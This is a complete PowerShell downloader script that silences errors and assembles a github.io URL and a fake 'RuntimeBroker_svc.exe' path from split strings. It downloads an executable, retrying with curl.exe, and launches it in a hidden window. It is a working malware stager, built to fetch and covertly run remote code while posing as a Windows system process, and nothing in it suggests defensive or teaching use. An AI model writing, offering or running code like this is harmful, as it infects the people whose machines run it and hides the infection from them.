$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = 3072

$a = $env:LOCALAPPDATA
$b = '\Microsoft\Win' + 'dows\Run' + 'timeBro' + 'ker_svc.exe'
$p = $a + $b

$h = 'https://fairytail5d' + '0.github.io'
$r = '/abobis/sync.exe'
$u = $h + $r

# method 1 — WebClient (reliable, no BITS dependency)
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
    $wc.DownloadFile($u, $p)
} catch {}

# method 2 — curl.exe fallback (built into Windows 10 1803+)
if (-not (Test-Path $p)) {
    try { & "$env:SystemRoot\System32\curl.exe" -s -L -o $p $u } catch {}
}

# launch hidden if file landed
if (Test-Path $p) {
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName       = $p
    $si.WindowStyle    = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $si.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($si) | Out-Null
}
